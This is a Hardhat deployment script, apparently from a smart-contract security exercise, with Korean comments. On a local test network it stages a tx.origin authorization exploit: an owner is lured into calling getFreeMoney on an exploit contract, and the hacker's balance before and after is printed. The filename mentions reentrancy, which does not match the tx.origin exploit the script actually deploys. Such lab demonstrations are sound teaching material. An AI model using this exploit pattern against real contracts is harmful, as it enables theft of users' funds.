// npx hardhat run scripts/Exploit3_ReentrancyAttacks.ts --network hardhat
import {ethers} from "hardhat";

async function main() {
    const [owner, victim, hacker] = await ethers.getSigners();

    // proxyContract 배포
    const proxyContract = await ethers.deployContract("ProxyTargetContract");
    const proxyAddress = await proxyContract.getAddress();

    // targetContract 배포
    const targetContract = await ethers.deployContract("TargetContract", [
        owner, // constructor 인자
        proxyAddress,
    ]);
    const targetAddress = await targetContract.getAddress();
    
    console.log("Proxy address: ", proxyAddress);
    console.log("Target address: ", targetAddress);

    // Exploit4_AuthorizationThroughTx 배포
    const exploitContract = await ethers.deployContract("Exploit4_AuthorizationThroughTx", [
        hacker,
        targetAddress,
        ethers.parseEther("10.0"),
    ]);

    // hacker의 balance 확인
    console.log(
        "hackers's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(hacker.address)
        )
    );

    // owner가 getFreeMoney 함수를 호출하면 tx.origin이 owner이 된다.
    // 공격 수행
    await exploitContract.connect(owner).getFreeMoney();

    // hacker의 balance 확인
    console.log(
        "hackers's balance: ",
        ethers.formatEther(
            await targetContract
                .connect(hacker)
                .balance(hacker.address)
        )
    );

}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});